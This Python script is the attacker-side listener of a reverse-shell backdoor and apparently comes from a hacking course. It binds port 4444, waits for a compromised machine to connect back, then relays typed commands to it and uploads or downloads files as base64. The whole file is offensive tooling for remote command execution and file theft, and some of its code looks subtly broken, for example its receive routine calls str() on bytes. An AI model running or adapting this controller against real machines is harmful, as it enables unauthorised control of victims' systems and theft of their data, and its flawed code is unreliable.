#!/usr/bin/env python
import socket, json # u can use pickle for serialization
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is the socket family, SOCK_STREAM is the socket typr
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # set socket option

        listener.bind((ip,port)) # bind to the incoming connection at the particular IP and TCP Port
        listener.listen(0) # listen for incomming connections
        print("[+] Waiting for incoming connection")

        # to allow the host to accept connection
        # accept() return the connection socket type and the address of the host connected
        self.connection, address = listener.accept()
        print(self.connection)
        print(address)
        print("[+] Got a connection from " , str(address))

    def reliable_send(self, data):
         json_data = json.dumps(data).encode() # serialize or pack object into a box(json_data) as a stream
         self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)  # unpack or deserialize a stream to an object
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
         with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")  # command command to list enable to access each element of the commands

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error"not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result= "[-] Error during command execution."

            print(result)

my_listener = Listener("127.0.0.1",4444)
my_listener.run()